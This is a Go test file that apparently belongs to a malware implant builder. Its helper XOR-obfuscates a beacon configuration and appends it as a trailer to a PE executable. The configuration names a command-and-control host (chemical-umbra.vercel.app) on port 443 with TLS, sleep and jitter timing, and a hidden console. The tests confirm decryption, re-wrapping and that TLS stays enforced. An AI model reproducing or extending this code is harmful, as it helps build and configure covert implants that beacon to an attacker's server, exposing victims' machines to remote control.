package api

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"strings"
	"testing"
)

func wrapWith(cfg PayloadConfig, exe []byte) []byte {
	exe = stripExistingTrailer(exe)
	js := marshalTrailer(cfg)
	var lenBuf [4]byte
	binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(js)))
	enc := make([]byte, len(js))
	for i, b := range js {
		enc[i] = b ^ byte(0x5A+(12+i))
	}
	return append(exe, append(append(trailerMagic(), lenBuf[:]...), enc...)...)
}

func TestTrailerRoundTripTLS(t *testing.T) {
	cfg := PayloadConfig{
		C2Host:         "chemical-umbra.vercel.app",
		C2Port:         "443",
		UseTLS:         true,
		SleepInterval:  180,
		Jitter:         40,
		HideConsole:    true,
	}
	normalizePayloadTLS(&cfg)
	if !cfg.UseTLS {
		t.Fatal("port 443 must force UseTLS")
	}
	patched := wrapWith(cfg, []byte("MZ-fake-pe"))
	if !verifyTrailer(patched, marshalTrailer(cfg)) {
		t.Fatal("verifyTrailer failed")
	}
	got, ok := decryptTrailerJSON(patched)
	if !ok {
		t.Fatal("decrypt failed")
	}
	s := string(got)
	if !strings.Contains(s, `"c2_host":"chemical-umbra.vercel.app"`) {
		t.Fatalf("host missing: %s", s)
	}
	if !strings.Contains(s, `"use_tls":"true"`) {
		t.Fatalf("use_tls not a quoted string (jval would miss it): %s", s)
	}
	if !strings.Contains(s, `"c2_port":"443"`) {
		t.Fatalf("port missing: %s", s)
	}
	sum := sha256.Sum256(patched)
	if len(sum) != 32 {
		t.Fatal("sha256 size")
	}
}

func TestStripDoubleWrap(t *testing.T) {
	cfg1 := PayloadConfig{C2Host: "old.example", C2Port: "80", UseTLS: false, SleepInterval: 10, Jitter: 1}
	cfg2 := PayloadConfig{C2Host: "chemical-umbra.vercel.app", C2Port: "443", UseTLS: true, SleepInterval: 180, Jitter: 40}
	normalizePayloadTLS(&cfg2)
	once := wrapWith(cfg1, []byte("MZ-fake-pe"))
	twice := wrapWith(cfg2, once)
	got, ok := decryptTrailerJSON(twice)
	if !ok {
		t.Fatal("decrypt after double wrap failed")
	}
	if bytes.Contains(got, []byte("old.example")) {
		t.Fatalf("stale trailer survived strip: %s", got)
	}
	if !bytes.Contains(got, []byte("chemical-umbra.vercel.app")) {
		t.Fatalf("new host missing: %s", got)
	}
	if !verifyTrailer(twice, marshalTrailer(cfg2)) {
		t.Fatal("verify after strip+wrap failed")
	}
}

func TestCustomConfigCannotKillTLSOn443(t *testing.T) {
	cfg := PayloadConfig{C2Host: "chemical-umbra.vercel.app", C2Port: "443", UseTLS: true}
	applyCustomConfig(&cfg, `{"use_tls":"false","c2_port":"443"}`)
	normalizePayloadTLS(&cfg)
	if !cfg.UseTLS {
		t.Fatal("custom_config flipped TLS off on port 443")
	}
}
